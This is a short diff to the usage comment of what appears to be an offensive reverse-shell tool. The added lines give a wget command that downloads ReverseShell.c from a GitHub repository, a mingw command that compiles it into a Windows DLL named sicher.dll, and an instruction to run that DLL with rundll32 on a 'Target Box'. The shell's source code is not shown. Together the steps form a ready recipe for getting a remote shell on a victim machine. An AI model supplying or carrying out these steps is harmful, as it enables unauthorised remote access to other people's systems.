@@ -1,10 +1,10 @@
 /*
 * USAGE: 
 *
-* Usage:
-* -Download ReverseShell.c on your system
-* -Compile it with: x86_64-w64-mingw32-gcc-8.3-win32 -shared -o sicher.dll ReverseShell.c -lws2_32
 * 
+* -Download ReverseShell.c on your system: wget https://raw.githubusercontent.com/moayadalmalat/Shells/master/ReverseShell.c
+* -Compile it with: x86_64-w64-mingw32-gcc-8.3-win32 -shared -o sicher.dll ReverseShell.c -lws2_32
+* -Run on Target Box rundll32.exe sicher.dll
 * 
 */
 
